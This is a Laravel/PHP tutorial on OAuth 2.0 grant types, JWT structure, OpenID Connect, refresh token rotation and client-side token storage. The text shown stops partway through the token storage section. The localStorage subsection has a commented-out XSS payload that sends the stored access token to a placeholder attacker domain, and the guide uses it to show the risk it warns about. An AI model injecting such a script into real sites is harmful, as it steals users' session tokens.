# OAuth 2.0 & JWT Authentication Guide

A comprehensive guide to OAuth 2.0, JWT, and modern authentication strategies for backend developers using PHP/Laravel.

## Table of Contents

1. [What is Authentication vs Authorization?](#1-what-is-authentication-vs-authorization)
2. [What is JWT (JSON Web Token)?](#2-what-is-jwt-json-web-token)
3. [How does JWT Authentication work?](#3-how-does-jwt-authentication-work)
4. [What is OAuth 2.0?](#4-what-is-oauth-20)
5. [OAuth 2.0 Grant Types](#5-oauth-20-grant-types)
6. [OAuth 2.0 Flow Step by Step](#6-oauth-20-flow-step-by-step)
7. [What is OpenID Connect (OIDC)?](#7-what-is-openid-connect-oidc)
8. [JWT vs Session-Based Authentication](#8-jwt-vs-session-based-authentication)
9. [Refresh Token Rotation](#9-refresh-token-rotation)
10. [Token Storage Strategies](#10-token-storage-strategies)
11. [Laravel Sanctum vs Laravel Passport](#11-laravel-sanctum-vs-laravel-passport)
12. [Social Login (Laravel Socialite)](#12-social-login-laravel-socialite)
13. [Security Best Practices](#13-security-best-practices)

---

## 1. What is Authentication vs Authorization?

- **Authentication (AuthN)** answers the question: "Who are you?"
  - It verifies the identity of a user or system.
  - Examples: logging in with email/password, fingerprint scan, OAuth login.
  - It happens **first** before any access decisions are made.

- **Authorization (AuthZ)** answers the question: "What are you allowed to do?"
  - It determines what resources or actions an authenticated user can access.
  - Examples: admin can delete posts, regular user can only read posts.
  - It happens **after** authentication.

- **Simple analogy:**
  - Authentication = showing your ID at the airport (proving who you are).
  - Authorization = your boarding pass (proving what flight you can board).

- **In Laravel terms:**
  - Authentication: `Auth::attempt(['email' => $email, 'password' => $password])`
  - Authorization: Gates, Policies, middleware like `can:edit-post`

```php
// Authentication - verifying identity
if (Auth::attempt(['email' => $email, 'password' => $password])) {
    // User is who they claim to be
}

// Authorization - checking permissions
Gate::define('delete-post', function (User $user, Post $post) {
    return $user->id === $post->user_id;
});
```

In short: Authentication proves identity; authorization controls access. You must authenticate before you can authorize.

---

## 2. What is JWT (JSON Web Token)?

- **JWT** is an open standard (RFC 7519) for securely transmitting information between parties as a compact, self-contained JSON object.
- It is digitally signed, so it can be verified and trusted.
- JWTs are commonly used for authentication and information exchange.

### JWT Structure

- A JWT consists of **three parts** separated by dots (`.`):
  - `xxxxx.yyyyy.zzzzz`
  - `Header.Payload.Signature`

- **Header:**
  - Contains metadata about the token.
  - Specifies the signing algorithm (e.g., HS256, RS256) and token type.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

- **Payload:**
  - Contains the **claims** (statements about the user and additional data).
  - Three types of claims:
    - **Registered claims:** Predefined, recommended fields like `iss` (issuer), `exp` (expiration), `sub` (subject), `iat` (issued at).
    - **Public claims:** Custom fields defined by the user, like `name` or `role`.
    - **Private claims:** Custom fields shared between parties, like `user_id`.
  - The payload is **NOT encrypted** by default -- anyone can decode it.
  - Never put sensitive data (passwords, credit card numbers) in the payload.

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin",
  "iat": 1516239022,
  "exp": 1516242622
}
```

- **Signature:**
  - Created by taking the encoded header, encoded payload, a secret key, and the algorithm.
  - Ensures the token has not been tampered with.
  - If anyone modifies the header or payload, the signature will not match.

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### Encoding vs Encryption

- **Encoding (what JWT does by default):**
  - JWT uses Base64URL encoding.
  - Encoding is **reversible** -- anyone can decode the header and payload.
  - It is NOT a security mechanism; it is just a format for safe transmission.
  - You can paste any JWT into [jwt.io](https://jwt.io) and read its contents.

- **Encryption (JWE -- JSON Web Encryption):**
  - An optional extension where the payload is actually encrypted.
  - Only the holder of the decryption key can read the contents.
  - Used when the payload contains sensitive information.
  - Less common than signed JWTs.

- **Key takeaway:** JWT is **signed** (to verify integrity) but **not encrypted** (anyone can read the payload). The signature only proves the token was not modified.

```php
// Decoding a JWT in PHP (no secret needed to READ it)
$parts = explode('.', $token);
$header = json_decode(base64_decode($parts[0]), true);
$payload = json_decode(base64_decode($parts[1]), true);
// Anyone can do this -- the payload is NOT secret
```

In short: JWT is a signed JSON token with three parts (header, payload, signature). It is encoded (readable) but signed (tamper-proof). Never store secrets in the payload.

---

## 3. How does JWT Authentication work?

### The JWT Authentication Flow

```
Step-by-step flow:

1. User sends login credentials (email + password)
   [Client] ---POST /api/login---> [Server]

2. Server validates credentials against the database
   [Server] ---verify password---> [Database]

3. Server creates a JWT with user data and signs it
   [Server] ---generates JWT---> access_token + refresh_token

4. Server sends the tokens back to the client
   [Server] ---tokens---> [Client]

5. Client stores the tokens and sends the access token with every request
   [Client] ---Authorization: Bearer <token>---> [Server]

6. Server verifies the token signature on each request
   [Server] ---verify signature---> allow/deny access

7. When the access token expires, client uses the refresh token to get a new one
   [Client] ---POST /api/refresh (refresh_token)---> [Server]
   [Server] ---new access_token---> [Client]
```

### Access Tokens

- Short-lived tokens (typically 15 minutes to 1 hour).
- Sent with every API request in the `Authorization` header.
- Contain user identity and permissions.
- When they expire, the user must refresh or re-authenticate.
- Should NOT be stored in localStorage in production (see section 10).

### Refresh Tokens

- Long-lived tokens (typically 7 to 30 days).
- Used ONLY to obtain new access tokens.
- Stored more securely than access tokens (httpOnly cookies).
- Should be rotated on each use (see section 9).
- Can be revoked server-side to log users out.

### Laravel Implementation with `firebase/php-jwt`

```php
// Install: composer require firebase/php-jwt

use Firebase\JWT\JWT;
use Firebase\JWT\Key;

class AuthController extends Controller
{
    // Login and issue tokens
    public function login(Request $request)
    {
        $credentials = $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        if (!Auth::attempt($credentials)) {
            return response()->json(['error' => 'Invalid credentials'], 401);
        }

        $user = Auth::user();

        // Create access token (short-lived)
        $accessToken = $this->createAccessToken($user);

        // Create refresh token (long-lived)
        $refreshToken = $this->createRefreshToken($user);

        return response()->json([
            'access_token' => $accessToken,
            'refresh_token' => $refreshToken,
            'token_type' => 'Bearer',
            'expires_in' => 3600, // 1 hour
        ]);
    }

    private function createAccessToken(User $user): string
    {
        $payload = [
            'iss' => config('app.url'),       // Issuer
            'sub' => $user->id,                // Subject (user ID)
            'iat' => time(),                   // Issued at
            'exp' => time() + 3600,            // Expires in 1 hour
            'name' => $user->name,
            'email' => $user->email,
            'role' => $user->role,
        ];

        return JWT::encode($payload, config('app.jwt_secret'), 'HS256');
    }

    private function createRefreshToken(User $user): string
    {
        $payload = [
            'iss' => config('app.url'),
            'sub' => $user->id,
            'iat' => time(),
            'exp' => time() + (7 * 24 * 3600), // Expires in 7 days
            'type' => 'refresh',
        ];

        return JWT::encode($payload, config('app.jwt_refresh_secret'), 'HS256');
    }

    // Verify token in middleware
    public function verifyToken(Request $request)
    {
        $token = $request->bearerToken();

        try {
            $decoded = JWT::decode($token, new Key(config('app.jwt_secret'), 'HS256'));
            return $decoded; // Contains user data from payload
        } catch (\Exception $e) {
            return response()->json(['error' => 'Invalid or expired token'], 401);
        }
    }

    // Refresh the access token
    public function refresh(Request $request)
    {
        $refreshToken = $request->input('refresh_token');

        try {
            $decoded = JWT::decode(
                $refreshToken,
                new Key(config('app.jwt_refresh_secret'), 'HS256')
            );

            $user = User::findOrFail($decoded->sub);
            $newAccessToken = $this->createAccessToken($user);

            return response()->json([
                'access_token' => $newAccessToken,
                'token_type' => 'Bearer',
                'expires_in' => 3600,
            ]);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Invalid refresh token'], 401);
        }
    }
}
```

In short: The client logs in, receives access and refresh tokens, and sends the access token with every request. When it expires, the refresh token is used to get a new one without re-entering credentials.

---

## 4. What is OAuth 2.0?

### What Problem Does OAuth 2.0 Solve?

- **The old way (before OAuth):**
  - If an app wanted to access your Google contacts, you had to give it your Google username and password.
  - The app could do anything with your account -- read emails, delete files, change your password.
  - You could not limit what the app could access.
  - The only way to revoke access was to change your password (breaking all other apps).

- **The OAuth 2.0 way:**
  - You never give your password to the third-party app.
  - Instead, you authorize the app to access specific things (e.g., "read contacts only").
  - You can revoke access to one app without affecting others.
  - The app gets a token with limited permissions, not your full credentials.

### Simple Explanation

- **OAuth 2.0** is an authorization framework that allows a third-party application to obtain limited access to a user's account on another service.
- It is an **authorization** protocol, NOT an authentication protocol (though it is often used for authentication with OpenID Connect).

- **The key players in OAuth 2.0:**
  - **Resource Owner:** The user who owns the data (you).
  - **Client:** The application that wants to access the user's data (e.g., a task manager app).
  - **Authorization Server:** The server that authenticates the user and issues tokens (e.g., Google's OAuth server).
  - **Resource Server:** The server that holds the protected data (e.g., Google Contacts API).

- **Real-world analogy:**
  - You (Resource Owner) go to a hotel.
  - You ask the front desk (Authorization Server) for a key card.
  - The key card (Access Token) only opens your room and the gym (scopes/permissions).
  - The key card does NOT open other rooms or the manager's office.
  - The hotel can deactivate the key card at any time (token revocation).

```
Simple OAuth 2.0 overview:

[User] --"I want to use App X with my Google data"--> [App X]
[App X] --"Redirect user to Google for permission"--> [Google Auth Server]
[Google] --"User, do you allow App X to read your contacts?"--> [User]
[User] --"Yes, I allow it"--> [Google Auth Server]
[Google] --"Here is an authorization code"--> [App X]
[App X] --"Exchange code for access token"--> [Google Auth Server]
[Google] --"Here is your access token"--> [App X]
[App X] --"Give me contacts (with token)"--> [Google Contacts API]
```

In short: OAuth 2.0 lets users grant limited access to their accounts on one service to another application, without sharing passwords. The app gets a token with specific permissions instead of full credentials.

---

## 5. OAuth 2.0 Grant Types

Grant types (also called "flows") define how the client obtains an access token. Each is suited for a different scenario.

### 5.1 Authorization Code Grant

- **Best for:** Server-side web applications (Laravel, Django, Rails).
- **How it works:**
  - User is redirected to the authorization server.
  - User grants permission.
  - The server returns an **authorization code** (not a token) to the client via redirect.
  - The client exchanges the authorization code for an access token on the backend (server-to-server).
  - The access token is never exposed to the browser.
- **Why it is secure:**
  - The authorization code is short-lived and single-use.
  - The token exchange happens on the server, not in the browser.
  - The client secret is kept on the server.

```
[Browser] --redirect--> [Auth Server] --auth code via redirect--> [Browser]
[Browser] --auth code--> [Your Server] --code + client_secret--> [Auth Server]
[Auth Server] --access token--> [Your Server]
```

### 5.2 Client Credentials Grant

- **Best for:** Machine-to-machine communication (no user involved).
- **Examples:** Microservices talking to each other, cron jobs calling APIs, server-side background tasks.
- **How it works:**
  - The client sends its `client_id` and `client_secret` directly to the authorization server.
  - The server returns an access token.
  - No user interaction, no redirects.

```php
// Laravel Passport - Client Credentials Grant
// The client (a microservice) authenticates itself
$response = Http::asForm()->post('https://your-app.com/oauth/token', [
    'grant_type' => 'client_credentials',
    'client_id' => config('services.api.client_id'),
    'client_secret' => config('services.api.client_secret'),
    'scope' => 'read-orders',
]);

$accessToken = $response->json('access_token');
```

### 5.3 Password Grant (Resource Owner Password Credentials)

- **Best for:** Highly trusted first-party applications only.
- **How it works:**
  - The user provides their username and password directly to the client application.
  - The client sends these credentials to the authorization server.
  - The server returns an access token.
- **Why it is discouraged:**
  - The client application sees the user's password.
  - Defeats the main purpose of OAuth (not sharing passwords).
  - Only appropriate when the client is the same entity as the authorization server (e.g., your own mobile app talking to your own API).
- **Note:** This grant type is being phased out in OAuth 2.1.

```php
// Password Grant - only for first-party apps
$response = Http::asForm()->post('https://your-app.com/oauth/token', [
    'grant_type' => 'password',
    'client_id' => config('services.api.client_id'),
    'client_secret' => config('services.api.client_secret'),
    'username' => 'user@example.com',
    'password' => 'user-password',
    'scope' => '*',
]);
```

### 5.4 Implicit Grant (Deprecated)

- **Was designed for:** Single-page applications (SPAs) that could not keep a client secret.
- **How it worked:**
  - The access token was returned directly in the URL fragment after authorization.
  - No authorization code exchange step.
- **Why it is deprecated:**
  - The token is exposed in the browser URL and history.
  - Vulnerable to token interception attacks.
  - No refresh tokens supported.
- **What to use instead:** Authorization Code with PKCE (see below).

### 5.5 Authorization Code with PKCE (Proof Key for Code Exchange)

- **Best for:** Public clients -- SPAs, mobile apps, desktop apps (clients that cannot securely store a secret).
- **PKCE** (pronounced "pixy") adds an extra security layer to the Authorization Code flow.
- **How it works:**
  - The client generates a random `code_verifier` (a long random string).
  - The client creates a `code_challenge` by hashing the verifier with SHA-256.
  - The client sends the `code_challenge` with the authorization request.
  - After the user authorizes, the client exchanges the authorization code along with the original `code_verifier`.
  - The authorization server hashes the verifier and compares it with the original challenge.
  - If they match, the server issues the access token.
- **Why it is secure:**
  - Even if an attacker intercepts the authorization code, they cannot exchange it without the `code_verifier`.
  - No client secret needed on the client side.

```php
// PKCE Flow - generating code verifier and challenge
// Step 1: Client generates code_verifier
$codeVerifier = bin2hex(random_bytes(32)); // 64 character random string

// Step 2: Client creates code_challenge from the verifier
$codeChallenge = rtrim(strtr(
    base64_encode(hash('sha256', $codeVerifier, true)),
    '+/', '-_'
), '=');

// Step 3: Authorization request includes the challenge
$authUrl = 'https://auth-server.com/authorize?' . http_build_query([
    'response_type' => 'code',
    'client_id' => 'your-client-id',
    'redirect_uri' => 'https://your-app.com/callback',
    'scope' => 'openid profile email',
    'code_challenge' => $codeChallenge,
    'code_challenge_method' => 'S256',
    'state' => bin2hex(random_bytes(16)), // CSRF protection
]);

// Step 4: Exchange code + verifier for tokens
$response = Http::asForm()->post('https://auth-server.com/token', [
    'grant_type' => 'authorization_code',
    'code' => $authorizationCode,
    'redirect_uri' => 'https://your-app.com/callback',
    'client_id' => 'your-client-id',
    'code_verifier' => $codeVerifier, // Proves we made the original request
]);
```

In short: Use Authorization Code for server apps, Client Credentials for machine-to-machine, PKCE for SPAs/mobile apps. Avoid Password Grant and never use Implicit Grant.

---

## 6. OAuth 2.0 Flow Step by Step

The **Authorization Code Flow** is the most common and recommended flow. Here is how it works step by step.

### The Complete Flow

```
Step 1: User clicks "Login with Google" on your app
=========================================================
[User] --clicks "Login with Google"--> [Your Laravel App]


Step 2: Your app redirects to Google's authorization endpoint
=========================================================
[Your App] --302 Redirect--> [Google Authorization Server]

   URL: https://accounts.google.com/o/oauth2/auth?
        response_type=code
        &client_id=YOUR_CLIENT_ID
        &redirect_uri=https://your-app.com/callback
        &scope=openid email profile
        &state=random_csrf_token


Step 3: User logs in and grants permission on Google
=========================================================
[Google] --"Your App wants to access your email and profile. Allow?"--> [User]
[User] --"Allow"--> [Google]


Step 4: Google redirects back to your app with an authorization code
=========================================================
[Google] --302 Redirect--> [Your App /callback]

   URL: https://your-app.com/callback?
        code=AUTHORIZATION_CODE
        &state=random_csrf_token


Step 5: Your server exchanges the code for tokens (server-to-server)
=========================================================
[Your Server] --POST /token--> [Google Token Endpoint]

   Body:
     grant_type=authorization_code
     code=AUTHORIZATION_CODE
     client_id=YOUR_CLIENT_ID
     client_secret=YOUR_CLIENT_SECRET
     redirect_uri=https://your-app.com/callback


Step 6: Google responds with tokens
=========================================================
[Google Token Endpoint] --JSON response--> [Your Server]

   {
     "access_token": "ya29.a0AfH6SM...",
     "refresh_token": "1//0gdkjf...",
     "expires_in": 3600,
     "token_type": "Bearer",
     "id_token": "eyJhbGciOi..."  (if using OpenID Connect)
   }


Step 7: Your server uses the access token to get user data
=========================================================
[Your Server] --GET /userinfo (Bearer token)--> [Google API]

   Response:
   {
     "sub": "1102547832",
     "name": "John Doe",
     "email": "john@gmail.com",
     "picture": "https://..."
   }


Step 8: Your server creates/finds the user and logs them in
=========================================================
[Your Server] --find or create user--> [Database]
[Your Server] --set session/issue JWT--> [User's Browser]
```

### Laravel Implementation

```php
// routes/web.php
Route::get('/auth/google', [OAuthController::class, 'redirect']);
Route::get('/auth/google/callback', [OAuthController::class, 'callback']);

// OAuthController.php
class OAuthController extends Controller
{
    // Step 2: Redirect to Google
    public function redirect()
    {
        $state = bin2hex(random_bytes(16));
        session(['oauth_state' => $state]);

        $params = http_build_query([
            'response_type' => 'code',
            'client_id' => config('services.google.client_id'),
            'redirect_uri' => config('services.google.redirect'),
            'scope' => 'openid email profile',
            'state' => $state,
            'access_type' => 'offline', // Request refresh token
            'prompt' => 'consent',
        ]);

        return redirect("https://accounts.google.com/o/oauth2/auth?{$params}");
    }

    // Steps 4-8: Handle the callback
    public function callback(Request $request)
    {
        // Verify state parameter (CSRF protection)
        if ($request->state !== session('oauth_state')) {
            abort(403, 'Invalid state parameter');
        }

        // Step 5: Exchange code for tokens
        $tokenResponse = Http::asForm()->post(
            'https://oauth2.googleapis.com/token',
            [
                'grant_type' => 'authorization_code',
                'code' => $request->code,
                'client_id' => config('services.google.client_id'),
                'client_secret' => config('services.google.client_secret'),
                'redirect_uri' => config('services.google.redirect'),
            ]
        );

        $tokens = $tokenResponse->json();

        // Step 7: Get user info
        $userResponse = Http::withToken($tokens['access_token'])
            ->get('https://www.googleapis.com/oauth2/v3/userinfo');

        $googleUser = $userResponse->json();

        // Step 8: Find or create user
        $user = User::updateOrCreate(
            ['email' => $googleUser['email']],
            [
                'name' => $googleUser['name'],
                'google_id' => $googleUser['sub'],
                'avatar' => $googleUser['picture'] ?? null,
            ]
        );

        Auth::login($user);

        return redirect('/dashboard');
    }
}
```

In short: The Authorization Code flow redirects the user to the provider, receives a short-lived code, exchanges it for tokens on the server side, and uses the access token to fetch user data.

---

## 7. What is OpenID Connect (OIDC)?

- **OAuth 2.0** is an **authorization** framework -- it tells apps what a user allows, but does NOT tell the app who the user is.
- **OpenID Connect (OIDC)** is a thin identity layer **on top of** OAuth 2.0 that adds **authentication**.
- OIDC answers the question: "Who is this user?" while OAuth 2.0 answers: "What can this user access?"

### How OIDC Extends OAuth 2.0

- **Everything in OAuth 2.0 still applies** -- same flows, same grant types, same token endpoints.
- OIDC adds these new pieces:
  - **ID Token:** A JWT that contains the user's identity information (name, email, profile picture).
  - **UserInfo Endpoint:** A standard API endpoint to get user profile data.
  - **Standard Scopes:** `openid`, `profile`, `email`, `address`, `phone`.
  - **Discovery Document:** A well-known URL that describes the provider's configuration.

### ID Tokens

- The ID Token is a **JWT** issued by the authorization server alongside the access token.
- It contains **claims** about the user's identity.
- It is intended for the **client application** (your app), NOT for accessing APIs.
- The **access token** is for accessing APIs; the **ID token** is for knowing who the user is.

```json
// Decoded ID Token payload
{
  "iss": "https://accounts.google.com",
  "sub": "1102547832",
  "aud": "your-client-id.apps.googleusercontent.com",
  "exp": 1616239022,
  "iat": 1616235422,
  "nonce": "abc123",
  "name": "John Doe",
  "email": "john@gmail.com",
  "email_verified": true,
  "picture": "https://lh3.googleusercontent.com/..."
}
```

- **Key ID Token claims:**
  - `iss` -- who issued the token (e.g., Google).
  - `sub` -- unique user identifier at the provider.
  - `aud` -- who the token is for (your client ID).
  - `exp` -- when the token expires.
  - `nonce` -- prevents replay attacks (you send it in the request and verify it in the response).

### Using OIDC in Laravel

```php
// When requesting authorization, include 'openid' scope
$params = http_build_query([
    'response_type' => 'code',
    'client_id' => config('services.google.client_id'),
    'redirect_uri' => config('services.google.redirect'),
    'scope' => 'openid email profile', // 'openid' triggers OIDC
    'state' => $state,
    'nonce' => $nonce, // Store this in session and verify later
]);

// After exchanging the code, you get an id_token in the response
$tokens = $tokenResponse->json();
$idToken = $tokens['id_token']; // This is a JWT

// Decode and verify the ID token
$decoded = JWT::decode($idToken, new Key($googlePublicKey, 'RS256'));

// Verify the nonce matches what we sent
if ($decoded->nonce !== session('oauth_nonce')) {
    abort(403, 'Invalid nonce - possible replay attack');
}

// Now you know who the user is
$userName = $decoded->name;
$userEmail = $decoded->email;
```

- **OAuth 2.0 without OIDC:** "This token allows reading contacts." (No idea who the user is.)
- **OAuth 2.0 with OIDC:** "This token allows reading contacts, and the user is John Doe (john@gmail.com)."

In short: OpenID Connect adds an identity layer to OAuth 2.0 by introducing ID Tokens (JWTs with user info). Use OAuth 2.0 for authorization; use OIDC when you also need to know who the user is.

---

## 8. JWT vs Session-Based Authentication

### Session-Based Authentication

- **How it works:**
  - User logs in; the server creates a session and stores it (in database, Redis, or file).
  - The server sends back a session ID as a cookie.
  - On every request, the browser sends the cookie; the server looks up the session data.
  - The server is **stateful** -- it must remember all active sessions.

- **Advantages:**
  - Easy to revoke -- just delete the session from the server.
  - The session ID in the cookie is opaque -- no user data is exposed.
  - Server has full control over active sessions.
  - Built-in support in most frameworks (Laravel, Rails, Django).
  - Smaller cookie size compared to JWTs.

- **Disadvantages:**
  - Requires server-side storage (database, Redis, files).
  - Harder to scale horizontally -- sessions must be shared across servers (sticky sessions or centralized store).
  - Does not work well for mobile apps or third-party API consumers.
  - CSRF protection required because cookies are sent automatically.

### JWT-Based Authentication

- **How it works:**
  - User logs in; the server creates a JWT and sends it to the client.
  - The client stores the JWT and sends it in the `Authorization` header with every request.
  - The server verifies the signature -- no session lookup needed.
  - The server is **stateless** -- it does not store any session data.

- **Advantages:**
  - Stateless -- no server-side storage needed.
  - Easy to scale horizontally -- any server can verify the token.
  - Works great for APIs, mobile apps, SPAs, and microservices.
  - Can carry user data in the payload (reducing database lookups).
  - No CSRF vulnerability when using `Authorization` header (not cookies).
  - Supports cross-domain authentication easily.

- **Disadvantages:**
  - Hard to revoke before expiration (requires a token blacklist, which adds state).
  - Larger payload than a session cookie.
  - Token payload is readable (Base64 encoded, not encrypted).
  - If the secret key is compromised, all tokens are compromised.
  - Must handle token refresh logic on the client.

### When to Use Which

- **Use Sessions when:**
  - Building a traditional server-rendered web application.
  - You need easy session revocation (logout, ban user).
  - Using Laravel Blade, Livewire, or Inertia.js.
  - Your app runs on a single server or you have Redis for session sharing.

- **Use JWT when:**
  - Building a REST API consumed by mobile apps or SPAs.
  - You need stateless authentication for microservices.
  - You need cross-domain or cross-service authentication.
  - Scaling horizontally with many servers.

```php
// Session-based (Laravel default)
// The server manages everything -- simple and secure
Auth::attempt(['email' => $email, 'password' => $password]);
// Session stored in database/Redis, cookie sent automatically

// JWT-based (API)
// Client must manage token storage and refresh
$token = JWTAuth::attempt(['email' => $email, 'password' => $password]);
return response()->json(['token' => $token]);
// Client sends: Authorization: Bearer <token>
```

In short: Sessions are simpler and easier to revoke (great for web apps); JWTs are stateless and scalable (great for APIs and microservices). Choose based on your application type.

---

## 9. Refresh Token Rotation

### What is Refresh Token Rotation?

- Refresh token rotation means that **every time a refresh token is used, it is invalidated and a new one is issued** alongside the new access token.
- The old refresh token can never be used again.
- This is a critical security measure for long-lived tokens.

### Why It Matters

- **Without rotation:**
  - If an attacker steals a refresh token, they can use it indefinitely (until it expires, which could be weeks or months).
  - The attacker can keep generating new access tokens undetected.

- **With rotation:**
  - If an attacker steals a refresh token and uses it, the legitimate user's next refresh will fail (because the token was already used).
  - This failure signals that the token family has been compromised.
  - The server can then invalidate **all tokens** in that family, forcing re-authentication.
  - This is called **automatic reuse detection**.

```
Without rotation (dangerous):
  Attacker steals refresh_token_A
  Attacker uses refresh_token_A --> gets new access_token (attacker has access)
  User uses refresh_token_A --> gets new access_token (still works!)
  Both attacker and user have valid tokens -- undetected breach

With rotation (secure):
  Attacker steals refresh_token_A
  Attacker uses refresh_token_A --> gets access_token + refresh_token_B
  User uses refresh_token_A --> FAILS (already used)
  Server detects reuse --> invalidates ALL tokens in the family
  Attacker's refresh_token_B is also revoked
  User must re-authenticate (secure, breach detected)
```

### Implementation in Laravel

```php
// Migration for refresh tokens table
Schema::create('refresh_tokens', function (Blueprint $table) {
    $table->id();
    $table->foreignId('user_id')->constrained()->onDelete('cascade');
    $table->string('token_hash')->unique();      // Hashed token
    $table->string('family_id');                   // Token family for rotation
    $table->boolean('revoked')->default(false);
    $table->timestamp('expires_at');
    $table->timestamps();

    $table->index(['family_id', 'revoked']);
});
```

```php
// RefreshTokenService.php
class RefreshTokenService
{
    // Issue a new refresh token (creates a new family)
    public function issueToken(User $user): string
    {
        $token = bin2hex(random_bytes(40));
        $familyId = Str::uuid()->toString();

        RefreshToken::create([
            'user_id' => $user->id,
            'token_hash' => hash('sha256', $token),
            'family_id' => $familyId,
            'revoked' => false,
            'expires_at' => now()->addDays(30),
        ]);

        return $token;
    }

    // Rotate: use old token, issue new one
    public function rotateToken(string $oldToken): array
    {
        $tokenHash = hash('sha256', $oldToken);

        $existingToken = RefreshToken::where('token_hash', $tokenHash)->first();

        // Token not found
        if (!$existingToken) {
            throw new AuthenticationException('Invalid refresh token.');
        }

        // Token already used -- possible theft detected!
        if ($existingToken->revoked) {
            // Revoke ALL tokens in this family (nuclear option)
            RefreshToken::where('family_id', $existingToken->family_id)
                ->update(['revoked' => true]);

            Log::warning('Refresh token reuse detected', [
                'user_id' => $existingToken->user_id,
                'family_id' => $existingToken->family_id,
            ]);

            throw new AuthenticationException(
                'Token reuse detected. All sessions revoked. Please login again.'
            );
        }

        // Token expired
        if ($existingToken->expires_at->isPast()) {
            $existingToken->update(['revoked' => true]);
            throw new AuthenticationException('Refresh token expired.');
        }

        // Revoke the old token
        $existingToken->update(['revoked' => true]);

        // Issue a new token in the same family
        $newToken = bin2hex(random_bytes(40));

        RefreshToken::create([
            'user_id' => $existingToken->user_id,
            'token_hash' => hash('sha256', $newToken),
            'family_id' => $existingToken->family_id, // Same family
            'revoked' => false,
            'expires_at' => now()->addDays(30),
        ]);

        $user = User::find($existingToken->user_id);

        return [
            'user' => $user,
            'refresh_token' => $newToken,
        ];
    }

    // Revoke all tokens for a user (logout everywhere)
    public function revokeAllForUser(int $userId): void
    {
        RefreshToken::where('user_id', $userId)->update(['revoked' => true]);
    }
}
```

```php
// Using the service in a controller
class TokenController extends Controller
{
    public function __construct(
        private RefreshTokenService $refreshTokenService
    ) {}

    public function refresh(Request $request)
    {
        $request->validate(['refresh_token' => 'required|string']);

        try {
            $result = $this->refreshTokenService->rotateToken(
                $request->input('refresh_token')
            );

            $accessToken = $this->createAccessToken($result['user']);

            return response()->json([
                'access_token' => $accessToken,
                'refresh_token' => $result['refresh_token'], // New rotated token
                'token_type' => 'Bearer',
                'expires_in' => 3600,
            ]);
        } catch (AuthenticationException $e) {
            return response()->json(['error' => $e->getMessage()], 401);
        }
    }
}
```

In short: Refresh token rotation invalidates the old token each time it is used and issues a new one. If a stolen token is reused, the server detects it and revokes the entire token family, protecting the user.

---

## 10. Token Storage Strategies

Where you store tokens on the client side has major security implications. Here are the three main options.

### httpOnly Cookies (Recommended for Web Apps)

- **How it works:**
  - The server sets the token in a cookie with the `HttpOnly` and `Secure` flags.
  - The browser sends the cookie automatically with every request.
  - JavaScript **cannot** access the cookie (prevents XSS token theft).

- **Advantages:**
  - Immune to XSS attacks (JavaScript cannot read httpOnly cookies).
  - Sent automatically by the browser (no client-side token management needed).
  - Can set `Secure` flag to ensure HTTPS only.
  - Can set `SameSite` flag to prevent CSRF.

- **Disadvantages:**
  - Vulnerable to CSRF attacks (must use `SameSite` cookies and/or CSRF tokens).
  - Limited to same-domain or configured cross-domain requests.
  - Cookie size limits (4KB per cookie).
  - Requires server-side configuration.

```php
// Laravel - setting token in httpOnly cookie
public function login(Request $request)
{
    // ... validate credentials ...

    $accessToken = $this->createAccessToken($user);
    $refreshToken = $this->refreshTokenService->issueToken($user);

    return response()->json(['message' => 'Logged in'])
        ->cookie(
            'access_token',          // Name
            $accessToken,            // Value
            60,                      // Minutes (1 hour)
            '/',                     // Path
            config('app.domain'),    // Domain
            true,                    // Secure (HTTPS only)
            true,                    // HttpOnly (no JS access)
            false,                   // Raw
            'Strict'                 // SameSite
        )
        ->cookie(
            'refresh_token',
            $refreshToken,
            60 * 24 * 30,           // 30 days
            '/',
            config('app.domain'),
            true,
            true,
            false,
            'Strict'
        );
}

// Middleware to read token from cookie
class JwtFromCookie
{
    public function handle(Request $request, Closure $next)
    {
        $token = $request->cookie('access_token');

        if ($token) {
            $request->headers->set('Authorization', 'Bearer ' . $token);
        }

        return $next($request);
    }
}
```

### localStorage

- **How it works:**
  - The client stores the token in `localStorage` using JavaScript.
  - The client reads it and adds it to the `Authorization` header on every request.
  - Data persists even after the browser tab or window is closed.

- **Advantages:**
  - Simple to implement.
  - Works well for SPAs.
  - Not sent automatically (immune to CSRF attacks).
  - Larger storage capacity (5-10MB).

- **Disadvantages:**
  - **Vulnerable to XSS attacks** -- any JavaScript on the page can read localStorage.
  - If an attacker injects a script (XSS), they can steal the token.
  - Data persists indefinitely unless manually cleared.
  - Not accessible across subdomains.

```javascript
// Storing in localStorage (common but less secure)
// After login response:
localStorage.setItem('access_token', response.data.access_token);

// On every API request:
axios.defaults.headers.common['Authorization'] =
    `Bearer ${localStorage.getItem('access_token')}`;

// Risk: any XSS vulnerability exposes the token
// <script>fetch('https://evil.com/steal?token=' + localStorage.getItem('access_token'))</script>
```

### sessionStorage

- **How it works:**
  - Same as localStorage, but data is cleared when the browser tab is closed.
  - Each tab has its own separate sessionStorage.

- **Advantages:**
  - Slightly better than localStorage -- token is cleared when the tab closes.
  - Not sent automatically (immune to CSRF).
  - Separate per tab (one tab's token leak does not affect others).

- **Disadvantages:**
  - **Still vulnerable to XSS attacks** (same as localStorage).
  - User must re-authenticate when opening a new tab.
  - Data is lost if the user accidentally closes the tab.
  - Not suitable for "remember me" functionality.

### Security Comparison Summary

- **XSS Protection:**
  - httpOnly Cookies: Protected (JavaScript cannot access).
  - localStorage: Vulnerable (JavaScript can read it).
  - sessionStorage: Vulnerable (JavaScript can read it).

- **CSRF Protection:**
  - httpOnly Cookies: Vulnerable (must add SameSite and/or CSRF tokens).
  - localStorage: Protected (not sent automatically).
  - sessionStorage: Protected (not sent automatically).

- **Persistence:**
  - httpOnly Cookies: Until expiry date.
  - localStorage: Forever (until manually cleared).
  - sessionStorage: Until the tab is closed.

- **Recommended approach for web apps:**
  - Store tokens in **httpOnly, Secure, SameSite=Strict cookies**.
  - Add CSRF protection as a second layer.
  - This protects against both XSS and (with SameSite) CSRF.

- **For SPAs talking to same-domain APIs:**
  - Use httpOnly cookies set by the server.
  - Use Laravel Sanctum's SPA authentication (cookie-based, CSRF-protected).

- **For SPAs talking to cross-domain APIs:**
